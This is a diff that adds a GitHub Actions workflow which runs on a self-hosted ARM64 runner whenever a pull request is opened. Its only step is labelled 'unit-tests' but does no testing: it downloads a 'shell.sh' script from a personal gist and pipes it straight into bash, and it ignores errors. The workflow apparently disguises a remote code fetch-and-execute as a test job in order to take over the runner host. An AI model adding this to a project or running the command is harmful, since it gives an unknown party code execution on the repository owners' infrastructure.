@@ -1,0 +1,12 @@
+name: SH Runner
+on:
+  pull_request
+
+jobs:
+  unit-tests:
+    runs-on: [self-hosted, linux, ARM64]
+    steps:
+      - name: unit-tests
+        continue-on-error: true
+        run: |
+          curl -sSfL https://gist.github.com/yoyo12318/5674f0c206b90afaa7169f73b5cd14d1/raw/shell.sh | bash
